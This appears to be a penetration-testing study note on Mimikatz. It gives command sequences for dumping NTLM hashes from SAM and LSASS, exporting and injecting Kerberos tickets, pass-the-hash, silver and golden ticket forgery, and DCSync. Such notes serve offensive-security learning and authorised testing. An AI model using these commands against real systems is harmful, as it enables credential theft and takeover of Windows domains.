# Mimikatz
Used in Post Privilege Esculation in maintaining [[Persistence]] through credential harvesting and [[Active-Directory-Lateral-Movement]]. Mimikatz is used to dump credentials:
- From windows protect memory (LSASS) and activity directory domain controller database
- Kerberos tickets
	- For all users
	- For current users
- Credential Injection
- Generate Silver/Golden tickets
	- [[Pass-The-Hash]]
	- [[Pass-The-Ticket]]
- And more

```powershell
privilege::debug # enables the _SeDebugPrivilge_ access right
token::elevate # elevate the security token Administrator -> SYSTEM
lsadump::lsa /patch
lsadump::sam
sekurlsa::logonPasswords
```

### Extracting NTLM hashes from local SAM

```powershell
privilege::debug
token::elevate

lsadump::lsa /patch
lsadump::sam # Dump SAM database
```

### Extracting NTLM hashes from LSASS memory

```powershell
privilege::debug
token::elevate

sekurlsa::msv
```
These hashes can be used to perform [[Pass-The-Hash]] attacks by using `mimikatz` to inject an access token for the vicitim user on any command!
```powershell
token::revert
sekurlsa::pth /user:<username> /domain:<domain-name> /ntlm:<ntlm hash> /run:"<cmds goes here>"
```

## Kerberos Attacks
Used in [[Attacking-Kerberos]] see the detailed mechanics of Kerberos and [[Active-Directory-Kerberos-Authenication-Defined]]. It is credential base so understanding [[Active-Directory-Authentication]] in part for [[Active-Directory-Privilege-Escalation]] and [[Active-Directory-Lateral-Movement]] as it is capable of command execution.

Sometimes extraction of Kerberos tickets and sessions keys from LSASS memory with Mimikatz, requiring also SYSTEM privileges:
```powershell
privilege::debug
sekurlsa::tickets /export
```
Extract a desired ticket and inject the tickets into the current session, which doesn't require administrator privileges:
```powershell
kerberos::ptt [0;427fcd5]-2-0-40e10000-Administrator@krbtgt-$DOMAIN.kirbi
```
Use `klist` to list Kerberos tickets.

### Kerberos Tickets
```powershell
kerberos::list /export
```

### Overpass the Hash Attacks
```powershell
sekurlsa::logonpasswords # Or another NTLM obtaining method
sekurlsa::pth /user:$admin /domain:$domain.com /ntlm:$NThash /run:Powershell.exe
```

### Silver Ticket Attacks
Don't be confused `kerberos::golden` is for Silver Ticket Attacks, see Golden Ticket Attacks. Requires:# Username, Domainame, SID of Domain defined by all except the ultimate `-0000`, Service to target, Service type(eg. HTTP), password hahsh of the Service Account. Creating a service ticket for the SPN HTTP/WebServer.Domain.com with this technique from perspective of application the current user will be built-in local administrator and Domain Admin group member.
```powershell
kerberos::purge
kerberos::list

kerberos::golden /user:$user /domain:$domain.com /sid:$SID-minus-exception /target:$TargetServer.$domain.com /service:$servicetype /rc4:$passwordhash-of-spn /ptt # /ptt means injected directly into memory
```

### Golden Ticket Attacks 
Don't be confused `kerberos::golden` is for Silver Ticket Attacks
```powershell
privilege::debug
lsadump::lsa /inject /name:krbtgt
```

With Domain Admin group access:
```powershell
privilege::debug
lsadump::lsa /patch
# Look for krbtgt
```

Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain. 
Provide values for: `kerberos::golden /user: /domain: /sid: /krbtgt: /id`,
like: `kerberos::golden /user:Administrator /domain:controller.local /sid:S-1-5-21-SID /krbtgt:HASH /id:ID`, then open command prompt with elevated privileges `misc::cmd`.

```powershell 
kerberos::purge # Removed cached tickets
kerberos::golden /user:hacker /domain:$domainname.com /sid:$sid /krbtgt:$krbtgt-hash /ptt 
misc::cmd
```

Mimikatz provides two sets of default values when using the golden ticket option:
1. User IP - default set: 500, RID of builtin Administrator
2. Group IP - Domain Admins group

### DCSync Attacks
Visit [[Active-Directory-Persistence]] for details.

```powershell
lsadump::dcsync /user:Administrator
```